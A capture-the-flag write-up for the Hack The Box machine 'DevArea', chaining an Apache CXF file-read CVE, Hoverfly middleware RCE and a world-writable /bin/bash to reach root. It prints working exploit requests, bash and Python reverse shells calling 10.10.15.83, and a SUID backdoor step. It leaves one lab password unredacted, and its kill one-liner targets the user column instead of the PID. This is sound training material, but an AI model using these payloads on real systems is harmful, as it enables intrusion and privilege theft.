# HTB — DevArea
**OS:** Linux | **Difficulty:** Medium  
**IP:** 10.129.24.47  
**Date:** 2026-03-30  
**Attack Path:** CVE-2022-46364 → Hoverfly RCE → World-writable bash → Root

---

## Recon

Add to `/etc/hosts`:

```bash
echo "10.129.24.47  devarea.htb" | sudo tee -a /etc/hosts
```

Full port scan:

```bash
nmap -sS -sV -p- 10.129.24.47
```

**Key ports:**

| Port | Service | Notes |
|------|---------|-------|
| 22 | SSH OpenSSH 9.6p1 | — |
| 80 | Apache 2.4.58 | Static frontend |
| 8080 | Jetty 9.4.27 | Apache CXF SOAP — **CVE-2022-46364** |
| 8500 | Go proxy | Hoverfly proxy (Basic auth) |
| 8888 | Go HTTP | Hoverfly admin API |
| 7777 | Python Flask | SysWatch web GUI |

---

## User Flag

### 1. SOAP endpoint & WSDL

Port 8080 runs Apache CXF on Jetty. Confirm the SOAP endpoint:

```bash
curl http://devarea.htb:8080/employeeservice
```

Retrieve the WSDL:

```bash
curl http://devarea.htb:8080/employeeservice?wsdl
```

Key findings:
- **Operation:** `submitReport`
- **Namespace:** `http://devarea.htb/`
- **Vulnerable field:** `content` (xs:string)

### 2. LFI via CVE-2022-46364 (MTOM XOP)

CVE-2022-46364 allows injecting an `xop:Include` element with a `file://` URI inside SOAP string parameters when MTOM is enabled. The server returns file contents base64-encoded in the response.

**Read `/etc/passwd`:**

```bash
curl -s http://devarea.htb:8080/employeeservice \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; boundary="MIMEBoundary"; start="<root.message@cxf.apache.org>"; start-info="text/xml"' \
  --data-binary $'--MIMEBoundary\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: <root.message@cxf.apache.org>\r\n\r\n<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\r\n  <soap:Body>\r\n    <ns2:submitReport xmlns:ns2="http://devarea.htb/">\r\n      <arg0>\r\n        <confidential>true</confidential>\n        <content><inc:Include href="file:///etc/passwd" xmlns:inc="http://www.w3.org/2004/08/xop/include"/></content>\n        <department>test</department>\n        <employeeName>test</employeeName>\n      </arg0>\n    </ns2:submitReport>\r\n  </soap:Body>\r\n</soap:Envelope>\r\n--MIMEBoundary--' \
  | grep -oP '(?<=Content: ).*(?=</return>)' | base64 -d
```

Reveals user: `dev_ryan:x:1001:1001::/home/dev_ryan:/bin/bash`

**Read Hoverfly service file:**

Change the `href` to `file:///etc/systemd/system/hoverfly.service`. Output:

```
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0
User=dev_ryan
```

**Credentials:** `admin` / `REDACTED`

### 3. RCE via Hoverfly Middleware (CVE-2024-45388)

Authenticate to the admin API on port 8888:

```bash
curl -s -X POST http://devarea.htb:8888/api/v2/token \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"REDACTED"}'
```

Start a listener:

```bash
nc -lvnp 4444
```

Inject a reverse shell as Hoverfly middleware:

```bash
curl -s -X PUT http://devarea.htb:8888/api/v2/hoverfly/middleware \
  -H "Authorization: Bearer <TOKEN>" \
  -H 'Content-Type: application/json' \
  -d '{"binary":"bash","script":"bash -i >& /dev/tcp/10.10.15.83/4444 0>&1"}'
```

Trigger by proxying traffic through Hoverfly:

```bash
curl -s -x http://devarea.htb:8500 http://example.com
```

Shell lands as `dev_ryan`.

### 4. User flag

```bash
cat /home/dev_ryan/user.txt
```

**User flag:** `REDACTED`

---

## Root Flag

### 1. Enumeration

```bash
sudo -l
```

Output:
```
(root) NOPASSWD: /opt/syswatch/syswatch.sh
```

```bash
ls -la /bin/bash
```

Output:
```
-rwxrwxrwx 1 root root 1446024 /bin/bash   ← world-writable!
```

Key findings:
- `/bin/bash` is **world-writable** (mode 777)
- `sudo /opt/syswatch/syswatch.sh` runs as **root**
- `syswatch.sh` has `#!/bin/bash` shebang — it invokes `/bin/bash`
- A **SysWatch Flask web GUI** runs on port 7777 as `syswatch` user

### 2. Spawn a non-bash shell

The current reverse shell IS bash, which holds the inode open (`Text file busy`). We need to spawn a shell that uses `/bin/sh` instead so no process has `/bin/bash` mapped:

On attack machine:
```bash
nc -lvnp 5555
```

From the dev_ryan shell:
```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.15.83",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

Kill any remaining bash processes:
```bash
kill $(ps aux | grep '/bin/bash' | grep -v grep | awk '{print $1}')
```

### 3. Replace bash with payload

Create a payload that sets the SUID bit on python3:

```bash
echo '#!/tmp/bash.bak' > /tmp/bash_payload
echo 'chmod u+s /usr/bin/python3' >> /tmp/bash_payload
chmod +x /tmp/bash_payload
```

Back up the real bash, then overwrite:
```bash
cp /bin/bash /tmp/bash.bak
cp /tmp/bash_payload /bin/bash
```

Since no bash process is running (we're in `/bin/sh`), the `cp` succeeds — no "Text file busy" error.

### 4. Trigger the payload as root

```bash
sudo /opt/syswatch/syswatch.sh
```

When `sudo` runs `syswatch.sh`, the kernel reads the shebang `#!/bin/bash` and executes our payload script instead of the real bash. The payload runs `chmod u+s /usr/bin/python3` as root, then exits.

Verify:
```bash
ls -la /usr/bin/python3
```

Should show `rwsr-xr-x` — SUID bit is set.

### 5. Root shell via python3 SUID

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
whoami
# root

cat /root/root.txt
```

**Root flag:** `REDACTED`

### 6. Cleanup

Restore the original bash:
```bash
cp /tmp/bash.bak /bin/bash
```

---

## Summary

| Step | Technique | Result |
|------|-----------|--------|
| 1 | CVE-2022-46364 MTOM/XOP LFI | Read `/etc/passwd` + `hoverfly.service` (creds) |
| 2 | Hoverfly middleware RCE (CVE-2024-45388) | Shell as `dev_ryan` |
| 3 | World-writable `/bin/bash` + `sudo syswatch.sh` | SUID set on `python3` |
| 4 | `python3` SUID → `os.setuid(0)` | Root shell |

### Key Insight

The trick to exploiting the world-writable bash is **releasing the inode first**. Since the reverse shell runs bash, the binary is locked ("Text file busy"). By spawning a Python-based `/bin/sh` shell and killing all bash processes, the inode is freed and `cp` can overwrite it. Then `sudo syswatch.sh` invokes the trojaned bash as root.
